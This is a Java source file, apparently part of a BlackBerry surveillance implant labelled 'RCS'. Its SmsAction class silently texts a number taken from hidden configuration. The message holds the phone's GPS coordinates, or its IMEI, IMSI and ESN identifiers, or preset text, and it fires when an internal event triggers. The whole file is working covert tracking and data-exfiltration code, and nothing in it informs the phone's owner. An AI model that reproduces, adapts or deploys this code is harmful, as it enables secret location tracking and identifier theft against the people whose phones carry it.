//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : SmsAction.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.action;

import java.io.EOFException;
import java.io.IOException;
import java.io.InterruptedIOException;

import javax.microedition.io.Connector;
import javax.microedition.io.Datagram;
import javax.microedition.io.DatagramConnection;
import javax.microedition.location.Criteria;
import javax.microedition.location.Location;
import javax.microedition.location.LocationException;
import javax.microedition.location.LocationProvider;
import javax.microedition.location.QualifiedCoordinates;
import javax.wireless.messaging.BinaryMessage;
import javax.wireless.messaging.MessageConnection;
import javax.wireless.messaging.TextMessage;

import net.rim.device.api.io.SmsAddress;
import net.rim.device.api.system.CDMAInfo;
import net.rim.device.api.system.GPRSInfo;
import net.rim.device.api.system.SMSPacketHeader;
import net.rim.device.api.system.SMSParameters;
import net.rim.device.api.system.CDMAInfo.CDMACellInfo;
import net.rim.device.api.system.GPRSInfo.GPRSCellInfo;
import net.rim.device.api.util.DataBuffer;
import net.rim.device.api.util.NumberUtilities;
import blackberry.Conf;
import blackberry.Device;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.event.Event;
import blackberry.utils.Check;
import blackberry.utils.Utils;
import blackberry.utils.WChar;

// TODO: Auto-generated Javadoc
/**
 * The Class SmsAction.
 */
public final class SmsAction extends SubAction {
	//#ifdef DEBUG
	static Debug debug = new Debug("SmsAction", DebugLevel.VERBOSE);
	//#endif

	private static final int TYPE_LOCATION = 1;
	private static final int TYPE_SIM = 2;
	private static final int TYPE_TEXT = 3;
	private static final int MAX_LEN_UCS2 = 70;
	private static final int MAX_LEN_8BIT = 70;

	String number;
	String text;
	int type;

	/**
	 * Instantiates a new sms action.
	 * 
	 * @param actionId_
	 *            the action id_
	 * @param confParams
	 *            the conf params
	 */
	public SmsAction(final int actionId_, final byte[] confParams) {
		super(actionId_);
		parse(confParams);
	}

	/*
	 * (non-Javadoc)
	 * @see blackberry.action.SubAction#execute(blackberry.event.Event)
	 */
	public boolean execute(final Event triggeringEvent) {

		try {
			switch (type) {
			case TYPE_TEXT:
			case TYPE_SIM:
				return sendSMS(text);

			case TYPE_LOCATION:
				// http://supportforums.blackberry.com/t5/Java-Development/How-To-Get-Cell-Tower-Info-Cell-ID-LAC-from-CDMA-BB-phones/m-p/34538
				getGPSPosition();

				break;
			}
			return true;
		} catch (Exception ex) {
			//#ifdef DEBUG_ERROR
			debug.error(ex);
			//#endif
			return false;
		}
	}

	private void getCellPosition() {

		//#ifdef DEBUG_TRACE
		debug.trace("getCellPosition");
		//#endif
		String message;

		final boolean gprs = !Device.isCDMA();
		if (gprs) {
			// CC: %d, MNC: %d, LAC: %d, CID: %d (Country Code, Mobile Network Code, Location Area Code, Cell Id).
			// CC e MNC possono essere estratti da IMEI
			// http://en.wikipedia.org/wiki/Mobile_country_code
			// http://en.wikipedia.org/wiki/Mobile_Network_Code
			final GPRSCellInfo cellinfo = GPRSInfo.getCellInfo();

			final int mcc = Integer.parseInt(Integer.toHexString(cellinfo
					.getMCC()));

			final int mnc = cellinfo.getMNC();
			final int lac = cellinfo.getLAC();
			final int cid = cellinfo.getCellId();

			final int bsic = GPRSInfo.getCellInfo().getBSIC();

			final StringBuffer mb = new StringBuffer();
			mb.append("MCC: " + mcc);
			mb.append(" MNC: " + mnc);
			mb.append(" LAC: " + lac);
			mb.append(" CID: " + cid);
			message = mb.toString();
		} else {
			final CDMACellInfo cellinfo = CDMAInfo.getCellInfo();
			//CDMAInfo.getIMSI()
			final int sid = cellinfo.getSID();
			final int nid = cellinfo.getNID();
			final int bid = cellinfo.getBID();

			final StringBuffer mb = new StringBuffer();
			mb.append("SID: " + sid);
			mb.append(" NID: " + nid);
			mb.append(" BID: " + bid);
			message = mb.toString();
		}
		//#ifdef DEBUG_INFO
		debug.info(message);
		//#endif

		sendSMS(message);
	}

	private void getGPSPosition() {

		LocationProvider lp = null;
		Criteria criteria = new Criteria();
		criteria.setCostAllowed(true);

		criteria.setHorizontalAccuracy(50);
		criteria.setVerticalAccuracy(50);
		criteria.setPreferredPowerConsumption(Criteria.POWER_USAGE_HIGH);

		try {
			lp = LocationProvider.getInstance(criteria);
		} catch (Exception e) {
			//#ifdef DEBUG_ERROR
			debug.error(e);
			//#endif
			return;
		}

		if (lp == null) {
			//#ifdef DEBUG_ERROR
			debug.error("GPS Not Supported on Device");
			//#endif   
			return;
		}

		try {
			Location loc = lp.getLocation(Conf.GPS_TIMEOUT);
			if (loc.isValid()) {
				QualifiedCoordinates qc = loc.getQualifiedCoordinates();

				StringBuffer sb = new StringBuffer();
				sb.append("LAT: " + qc.getLatitude() + "\r\n");
				sb.append("LON: " + qc.getLongitude() + "\r\n");

				sendSMS(sb.toString());
			}

		} catch (LocationException e) {
			//#ifdef DEBUG_ERROR
			debug.error(e);
			//#endif
		} catch (InterruptedException e) {
			//#ifdef DEBUG_ERROR
			debug.error(e);
			//#endif
		}

	}

	boolean sendSMS(final String message) {
		boolean ret = true;
		if (Device.isCDMA()) {
			//#ifdef DEBUG_TRACE
			debug.trace("sendSMS: Datagram");
			//#endif
			ret = sendSMSDatagram(number, message);
		} else {
			//#ifdef DEBUG_TRACE
			//debug.trace("sendSMS: Binary");
			//#endif
			//ret = sendSMSBinary(message);

			//#ifdef DEBUG_TRACE
			//debug.trace("sendSMS: Text");
			//#endif
			ret = sendSMSText(number, message);
		}
		return ret;
	}

	public static boolean sendSMSText(final String number, final String message) {

		//#ifdef DEBUG_INFO
		debug.info("Sending sms Message to: " + number + " message:" + message);
		//#endif
		try {
			final MessageConnection conn = (MessageConnection) Connector
					.open("sms://");
			// generate a new text message
			final TextMessage tmsg = (TextMessage) conn
					.newMessage(MessageConnection.TEXT_MESSAGE);
			// set the message text and the address
			tmsg.setAddress("sms://" + number);

			tmsg.setPayloadText(message);
			// finally send our message

			conn.send(tmsg);
		} catch (final InterruptedIOException e) {
			//#ifdef DEBUG
			debug.error("Cannot send message sms to: " + number + " ex:" + e);
			//#endif
			return false;
		} catch (final IOException e) {
			//#ifdef DEBUG
			debug.error("Cannot send message sms to: " + number + " ex:" + e);
			//#endif
			return false;
		}
		return true;
	}

	public static boolean sendSMSBinary(final String number,
			final String message) {

		//#ifdef DEBUG_INFO
		debug.info("Sending sms Message to: " + number + " message:" + message);
		//#endif
		try {
			final MessageConnection conn = (MessageConnection) Connector
					.open("sms://");
			// generate a new text message
			final BinaryMessage bmsg = (BinaryMessage) conn
					.newMessage(MessageConnection.BINARY_MESSAGE);
			// set the message text and the address
			bmsg.setAddress("sms://" + number);

			//tmsg.getAddress();
			//SMSPacketHeader smsPacketHeader = smsAddress.getHeader(); 

			bmsg.setPayloadData(message.getBytes("UTF-8"));
			// finally send our message

			conn.send(bmsg);
		} catch (final InterruptedIOException e) {
			//#ifdef DEBUG
			debug.error("Cannot send message sms to: " + number + " ex:" + e);
			//#endif
			return false;
		} catch (final IOException e) {
			//#ifdef DEBUG
			debug.error("Cannot send message sms to: " + number + " ex:" + e);
			//#endif
			return false;
		}
		return true;
	}

	public static boolean sendSMSDatagram(final String number,
			final String message) {

		//#ifdef DEBUG_INFO
		debug
				.info("Sending sms Datagram to: " + number + " message:"
						+ message);
		//#endif
		try {
			final DatagramConnection conn = (DatagramConnection) Connector
					.open("sms://" + number);

			SmsAddress destinationAddr = new SmsAddress("//" + number);
			SMSPacketHeader header = destinationAddr.getHeader();
			// no need for the report
			header.setStatusReportRequest(false);
			// we are going to use the UDH
			header.setUserDataHeaderPresent(true);
			// setting the validity and delivery periods
			header.setValidityPeriod(SMSParameters.PERIOD_INDEFINITE);
			header.setDeliveryPeriod(SMSParameters.PERIOD_INDEFINITE);
			// setting the message class
			header.setMessageClass(SMSParameters.MESSAGE_CLASS_1);
			// setting the message encoding - we are going to send UTF-8 characters so
			// it has to be 8-bit
			header.setMessageCoding(SMSParameters.MESSAGE_CODING_8_BIT);

			byte[] data = message.getBytes("UTF-8");

			Datagram dg = conn.newDatagram(conn.getMaximumLength());
			dg.setData(data, 0, Math.min(data.length, MAX_LEN_8BIT));
			conn.send(dg);

		} catch (final InterruptedIOException e) {
			//#ifdef DEBUG
			debug.error("Cannot send Datagram sms to: " + number + " ex:" + e);
			//#endif
			return false;
		} catch (final IOException e) {
			//#ifdef DEBUG
			debug.error("Cannot send Datagram sms to: " + number + " ex:" + e);
			//#endif
			return false;
		}
		return true;
	}

	/*
	 * (non-Javadoc)
	 * @see blackberry.action.SubAction#parse(byte[])
	 */
	protected boolean parse(final byte[] confParams) {
		final DataBuffer databuffer = new DataBuffer(confParams, 0,
				confParams.length, false);
		try {
			type = databuffer.readInt();

			//#ifdef DBC
			Check.asserts(type >= 1 && type <= 3, "wrong type");
			//#endif

			int len = databuffer.readInt();
			byte[] buffer = new byte[len];
			databuffer.read(buffer);
			number = Utils.Unspace(WChar.getString(buffer, true));

			switch (type) {
			case TYPE_TEXT:
				len = databuffer.readInt();
				buffer = new byte[len];
				databuffer.read(buffer);
				text = WChar.getString(buffer, true);
				break;
			case TYPE_LOCATION:
				// http://supportforums.blackberry.com/t5/Java-Development/How-To-Get-Cell-Tower-Info-Cell-ID-LAC-from-CDMA-BB-phones/m-p/34538
				break;
			case TYPE_SIM:
				StringBuffer sb = new StringBuffer();
				Device device = Device.getInstance();
				if (Device.isCDMA()) {

					sb.append("SID: " + device.getSid() + "\n");
					sb.append("ESN: "
							+ NumberUtilities.toString(device.getEsn(), 16)
							+ "\n");
				} else {
					sb.append("IMEI: " + device.getImei() + "\n");
					sb.append("IMSI: " + device.getImsi() + "\n");
				}

				text = sb.toString();
				break;
			default:
				//#ifdef DEBUG_ERROR
				debug.error("SmsAction.parse,  Unknown type: " + type);
				//#endif
				break;
			}

		} catch (final EOFException e) {

			return false;
		}

		return true;
	}

	public String toString() {
		final StringBuffer sb = new StringBuffer();
		sb.append("Sms type: " + type);
		sb.append(" number: " + number);
		sb.append(" text: " + text);

		return sb.toString();
	}
}
